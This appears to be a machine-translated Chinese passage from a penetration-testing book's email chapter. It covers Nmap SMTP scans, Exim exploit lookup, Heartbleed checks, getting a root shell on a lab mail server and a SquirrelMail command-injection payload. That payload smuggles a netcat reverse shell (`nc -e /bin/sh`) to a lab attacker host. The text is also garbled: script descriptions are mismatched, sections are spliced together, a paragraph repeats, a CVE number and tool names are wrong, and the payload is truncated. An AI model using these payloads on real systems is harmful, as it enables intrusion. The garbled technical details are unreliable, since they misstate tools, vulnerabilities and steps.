
| 脚本名称 | 描述 |
| :--- | :--- |
| `smb-domain.nse` | 尝试通过诱导看似 SMTP 命令来中继邮件。 |
| `smb2-user-enum.nse` | 目标是测试服务器是否易受邮件中继攻击。 |
| `smb-brute.nse` | |
| `smtp-enum-users.nse` | 一个作为开放中继的 NSE 脚本，该邮件服务器允许未授权用户从指定的邮箱地址发送邮件。在这种情况下，用户将能够从他们想要的任何主机源发送邮件。 |
| `smb-open-relay.nse` | |
| `smb-vuln-2004-3346` | 检查基于对 `MAIL FROM` 和 `RCP TO` 命令的检查。脚本从源文件加载。脚本将输出所有执行的工作。 |
| `smb-vuln-0-2011-1726` | 除非另有说明，否则脚本以详细模式运行。脚本将报告成功测试的数量。 |
| `smb-test.nse` | 如果服务器需要身份验证，脚本将不会输出。 |
| `smb-http-logins.nse` | 如果启用了调试并在测试目标主机时发生错误，脚本将打印在此之前发现的任何组合。 |
| `smb-interface.nse` | |
| `smb-pos-config.nse` | |
| `smb-process.nse` | |
| `smb-connector.nse` | |

图 6.5: NSE 脚本发现器

## 第 6 章 ■ 电子邮件

你不需要使用此工具来搜索和查看有关 Nmap 脚本的信息；你也可以从文件系统中手动查看文件。为了演示 Nmap 脚本，我们将再次关注端口 25 上的 SMTP 服务。使用 `nsdiscover` 向下滚动脚本列表，直到找到 SMTP 脚本。要使用 Nmap 运行其中一个脚本，请提供 `--script` 选项并在后跟脚本名称。你需要指定目标的 IP 地址和你想要扫描的端口号。此外，如果你不想在服务器的每个端口上运行为 SMTP 设计的脚本，你可以按照如下方式运行所有以 `smtp-*`（通配符字符）开头的脚本：

```bash
nmap --script=smtp-* 192.168.56.102 -p 25
```

上一条命令在主机 `192.168.56.102` 上运行所有 SMTP 脚本，仅针对端口 25。由于没有提供其他选项，Nmap 还会运行其默认端口扫描。同时运行多个脚本可能会导致问题，例如系统不稳定。此外，由于存在几个活跃的利用，因此在运行此类 `wildcrab` 探测时要小心。某些脚本需要额外的参数才能运行，我们将在未来的章节中介绍这些内容。在将脚本用于任何客户端系统之前，在自己的隔离实验环境中测试脚本是非常重要的，以确保其行为正确。运行 Wireshark 或其他数据包捕获工具是进一步了解 Nmap 脚本、它们执行的操作以及对主机的潜在影响的好方法。

你会发现运行 SMTP 脚本显示了虚拟邮件服务器上 Exim 软件的几个潜在漏洞。你会在 Nmap 扫描结果中看到类似的内容：

| 漏洞脚本 | 版本信息 | 漏洞详情 |
| :--- | :--- | :--- |
| `smtp-vuln-cve2010-4344` | Exim 版本: 4.68 | Exim 堆溢出漏洞 (CVE-2010-4344): |
| | Exim (CVE-2010-4344): 极可能存在漏洞 | Exim 提升漏洞 (CVE-2010-4345): |
| | Exim (CVE-2010-4345): 极可能存在漏洞 | |

Nmap 报告该主机可能包含两个已知漏洞：`CVE-2010-4344` 和 `CVE-2010-4345`。为了确定，你需要利用并验证脚本的结果（这些结果源于欢迎 banner）。使用 `searchploit` 查找这些漏洞的利用程序。两者都是 Exim（SMTP 软件）的漏洞。搜索 `exim` 应该会显示合适的结果：

```bash
searchploit exim
```

该命令返回的利用程序之一是 `Exim4 < 4.69 - string-format Function Heap Buffer Overflow (Metasploit)`。这是针对 `CVE-2010-4344` 缓冲区溢出漏洞的利用程序。括号中的 Metasploit 表示该利用有一个 Metasploit 模块，或者它包含在框架中。Metasploit 有自己的内置搜索功能，你可以在 Metasploit 中以类似的方式使用它。

> 注意：缓冲区溢出发生在程序意外地向其分配的内存空间之外写入数据，覆盖了相邻内存位置的数据。这种行为可以通过导致漏洞程序用恶意代码覆盖已知包含可执行代码的内存位置来利用。

## CVE-2014-0160: 心血漏洞 (Heartbleed Bug)

心血漏洞是一个著名漏洞的例子。它不仅朗朗上口（与 `CVE-2014-0160` 相比），而且还是一个双关语，因为故障元素被称为“心跳”（heartbeat，稍后详细介绍）。它也非常严重，因为它影响了设计用于发送密码和信用卡信息等敏感信息的软件。该缺陷允许此类信息的披露实际上字面上泄露（或出血）了系统的内部内存。如果所有漏洞都能这样贴切地命名就好了！这个漏洞在全球范围内引起了巨大的轰动，并进入了主流视野。FBI 的主页以及互联网上使用 OpenSSL（SSL/TLS 协议的开源实现）的大多数网站都存在漏洞。许多系统受到了影响，尽管该漏洞可以追溯到 2014 年，但它仍会偶尔出现，通常是在未公开的系统上。漏洞不在于协议本身，而是在软件库中对协议的一种特定实现——OpenSSL。恰好 OpenSSL 被广泛使用。

现在让我们来看看什么是 TLS 心跳，以及为什么这导致了该漏洞。两个主机使用 SSL/TLS 建立所谓的连接。这发生在你通过 HTTP 访问网页或从你的 MUA（用户邮件客户端）向现代 MTA（邮件传输代理）发送邮件时（例如，从 Thunderbird 向监听端口 587 的远程 Exim 服务发送邮件）。为了保持连接“活跃”，会使用被称为心跳的东西，让每个主机知道对方仍在监听或可能稍后需要发送某些信息。心跳首先在 TLS 协议记录中发送一段短数据。发送者将指定一个单词或字符字符串如 `"HELLO"`，并在 TLS 协议记录中将其长度指定为 16 位（2 字节）无符号整数（或短整数）。在 `"HELLO"` 的情况下，发送者发送了一个五个字符的字符串。因此，发送者发送 `"HELLO"` 和长度 5（作为包含该值的 2 字节）。

漏洞不在于协议本身，而是在软件库中对协议的一种特定实现——OpenSSL。恰好 OpenSSL 被广泛使用。

## 第 6 章 ■ 电子邮件

```text
linux-vdso.so.1 (0x00007ff474f70000)
libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1
```

```text
libz.so.2 => /lib/x86_64-linux-gnu/libz.so.2
(000007f2583c9e00)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
(000007f25838ad000)
```

```text
/lib64/ld-linux-x86-64.so.2 (0x00007f2584168000)
```

这表明应用程序没有使用系统的 `libssl` 或类似的库。这意味着我们正在使用静态 OpenSSL 库进行测试。这意味着如果我们降级系统的 OpenSSL 库，也不会产生任何影响，因为此工具使用的是它内置的库。由于此版本是新的，并且修复了许多 SSL 协议漏洞，我们选择使用较早版本的库，以确保测试能够准确反映目标的漏洞，而不是你的本地配置。幸运的是，我们始终可以降级工具来使用旧版本的库或包，以确保我们的漏洞检查是准确的。从 `old.kali.org` 仓库下载并安装旧版本的 SSLscan。

```bash
wget http://old.kali.org/kali/pool/main/sscan/sslscan_1.9.10-rbsec-0kali1_amd64.deb
dpkg -i sslscan_1.9.10-rbsec-0kali1_amd64.deb
```

此时，你应该已经安装了一个使用静态版本 OpenSSL 的 SSLscan 版本，它可以用于测试漏洞。运行版本命令进行验证。

```bash
sslscan --version
```

```text
-static
OpenSSL 1.0.1m-dev xx XXX XXXX
```

输出显示该工具使用的 OpenSSL 版本要旧得多，并且包含了识别漏洞所需的废弃协议功能。你可以尝试使用以下命令对虚拟邮件服务器运行此工具：

```bash
sslscan 192.168.56.102
```

```text
Version: -static
OpenSSL 1.0.1m-dev xx XXXxxxx

Testing SSL server 192.168.56.102 on port 643

TLS renegotiation:
Secure session renegotiation supported

TLS Compression:
Compression disabled
```

## 第 6 章 电子邮件

Heartbleed:

- TLS 1.0 不易受 Heartbleed 攻击
- TLS 1.1 易受 Heartbleed 攻击
- TLS 1.2 易受 Heartbleed 攻击

支持的加密算法：

| 接受 | 位数 | 加密算法 |
| :--- | :--- | :--- |
| TLSv1.0 | 256 bits | ECDHE-RSA-AES256-SHA |
| TLSv1.0 | 256 bits | DHE-RSA-AES256-SHA |
| TLSv1.1 | 256 bits | ECDHE-RSA-AES256-SHA |
| TLSv1.2 | 256 bits | ECDHE-RSA-AES256-GCM-SHA384 |
| TLSv1.2 | 256 bits | ECDHE-RSA-AES256-SHA384 |
| TLSv1.2 | 256 bits | ECDHE-RSA-AES256-SHA |
| TLSv1.2 | 256 bits | DHE-RSA-AES256-GCM-SHA384 |
| TLSv1.2 | 256 bits | DHE-RSA-AES256-SHA256 |
| TLSv1.2 | 128 bits | DHE-RSA-AES128-SHA256 |
| TLSv1.2 | 128 bits | DHE-RSA-AES128-GCM-SHA256 |

首选加密算法：

- TLSv1.0 256 bits ECDHE-RSA-AES256-SHA
- TLSv1.1 256 bits ECDHE-RSA-AES256-SHA
- TLSv1.2 256 bits ECDHE-RSA-AES256-GCM-SHA384

SSL 证书：

- 签名算法: SHAWithRSAEncryption
- 密钥强度: 1024
- 主题: hackblob.linux01.lab
- 发行者: Superfish, Inc.

根据屏幕输出显示的结果，我们的服务器似乎容易通过 TLS 受到 Heartbleed 攻击。你可能会发现 SSL 工具给出的结果不同、产生假误报或没有按预期做出响应，这可能是由于 SSL 库不匹配导致的。多次运行工具以获得最准确的评估，并尝试使用与主机版本匹配的 SSL 库测试 SSL 服务，以确保功能没有被弃用。在使用旧库之后，你可以只需运行 `apt update sslscan` 重新获取最新版本。

你也可以使用 `ssl-heartbleed` Nmap 脚本，它会探测已识别的 SSL 服务的 TLS 心跳响应。该脚本对你机器上 OpenSSL 版本的依赖较小，因此可以以很高的准确度使用。这可以确定目标是否易受攻击。

```bash
nmap --script ssl-heartbleed 192.168.56.102
```

```text
Starting Nmap for 192.168.56.102 (Host scan up)
192.168.56.102 is up
Port 443/tcp is open ssl
ssl-heartbleed:
  State: VULNERABLE
  SSL: OpenSSL 1.0.1m-dev
  Vulnerability: CVE-2014-0160
```

这里没有提示符（prompt），但你可以输入命令。这是远程机器（虚拟邮件服务器）上的一个 shell，因此你输入的任何内容都将被记录在那里，如果是合法的命令，它将会被执行。一个很好的尝试的第一个命令是 `id`。这个利用应该让你立即获得 root 用户账户权限（并不总是如此），这可以通过 `id` 的输出来确认。

```text
uid=0 (root) gid=0 (root) groups=0(root)
```

另一个利用是使用 `uname -a`，它将为你提供有关系统的信息，例如内核和操作系统，如下文所示：

```text
Linux mailserver01 3.16.0-4-586 #1 Debian 3.16.43-2 (2017-04-30) i686
GNU/Linux
```

你对这台机器拥有 root 权限，可以对它做任何你想做的事。然而，问题是，你可能没有一个具有正确提示符的 shell。尝试在文件系统中移动并进行一些探索。如果没有适当的 shell，这可能会让人感到沮丧。我们使用的利用技术是由 Joshua Drake 开发的，它与两个漏洞协同工作以提供远程 shell。它是远程 root 利用以及如何开发可靠代码的绝佳示例。

## 升级你的 Shell

为了让生活更轻松，你可以执行一些可以称作“升级你的 shell”的操作。这并不是一个技术术语，但它完美地描述了你正在做的事情。正如你将看到的，许多利用并没有像前面演示的那样获得 root 权限，而升级 shell 对于在远程主机上运行进一步的利用以提升权限是必要的。有许多方法可以进行升级，但其中一个非常棒的方法是运行以下 Python 一行命令：

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

这是一个完整的 Python 程序，它导入了 `pty` 模块（来自 Python 库），然后运行了 `spawn` 函数。传递给这个 `spawn` 的参数是 `/bin/bash`，这是大多数 Unix 类系统上 bash 解释器的完整路径。这一切都是在目标机器上完成的。我们依赖于 Python 安装了必要的 `pty` 模块，并且它存在于 `/bin` 目录中。

> 提示：Metasploit 框架包含一个用于管理在远程主机上执行的负载的命令。你可以使用 `sessions` 命令来交互列出所有当前可用会话、杀死会话以及控制会话。一个非常有用的功能是 `sessions -u`，它可以升级类似于从 Exim 利用中获得的终端。它的实现方式与 Python 示例类似。

一旦你运行了 `program01`：你应该看到类似如下的提示符：

```text
root@mailserver01:/var/spool/exim
```

你现在拥有了一个交互式终端，可以随心所欲且轻松地遍历文件系统了！获得这一点后，如果你为客户工作，你会小心地进入下一个阶段，利用阶段将涉及捕获影子文件（shadow files），并检查公司不希望被访问的关键信息是否存在。当你向客户解释该问题的严重性时，这会为你的报告增加真实价值。在发现此类漏洞时，可以通过运行脚本（这是一项简单的活动）获得 root 权限，你应该立即通知你的客户。在与他们交谈时，你脑中还应该准备好修复建议，例如更新软件或临时禁用它。这种类型的问题被认为是关键的，应该尽早上报。2019 年 6 月 6 日，Exim 中发现了一个新漏洞（`CVE-2019-1014`）。该漏洞允许以我们刚刚检查的问题类似的方式进行远程命令执行和权限提升。从历史上看，Exim 一直是 Linux 主机漏洞的来源，这种趋势可能会持续。

## 利用 CVE-2017-7692

这个特定的漏洞影响一个名为 SquirrelMail 的 Web 客户端。我们将查看 MTA 使用时如何利用此漏洞。与之前检查的其他利用相比，这个特定的利用执行起来稍微有点复杂——它是一项高级练习，你可以在完成后续内容后回来这里复习。以下解释的部分在你读完后两章后（第 7 章“漏洞世界”和第 12 章“Web 应用程序”）将会有更多意义。因为它专门演示了通过 `mail()` 函数在邮件功能中命令注入的概念，因此我们将其包含在此处。你需要使用一个中间人代理工具，例如 Burp Suite 的免费版，或者对于倾向于使用命令行的人来说，使用命名恰当的 Mitmproxy（中间人代理）。这两个工具都包含在 Kali Linux 中。我们将在第 7 章中探索 Burp Suite，它将成为我们拦截和检查 HTTP 请求的首选工具。它为许多 Web 任务提供了图形界面，是许多安全专家首选工具。要利用 `CVE-2017-7692`，首先作为用户（你已经通过其他手段获取了凭据）登录 SquirrelMail 应用，并进入个人信息。将用户的邮箱地址设置为 `a@a.com`，确保 Burp Suite 中开启了 Intercept（拦截）。当你点击 Submit（提交）时，Burp Suite 会拦截你的 Web 请求。在 Burp Suite 的 Intercept 标签页中，将 POST 请求中的参数 `new_email_address` 更改为：

```text
new_email_address=%40localhost%2b%09$run("/bin/nc%09-e%09/bin/sh%192.168.56.100%
```

（注：原文末尾的 `%192` 疑似为误，应为 `%192`，此处保留原文内容）

```text
new_email_address=%40localhost%2b%09$run("/bin/nc%09-e%09/bin/sh%192.168.56.100%
```

（注：根据上下文，原文此处可能存在截断或格式错误，此处按字面保留）
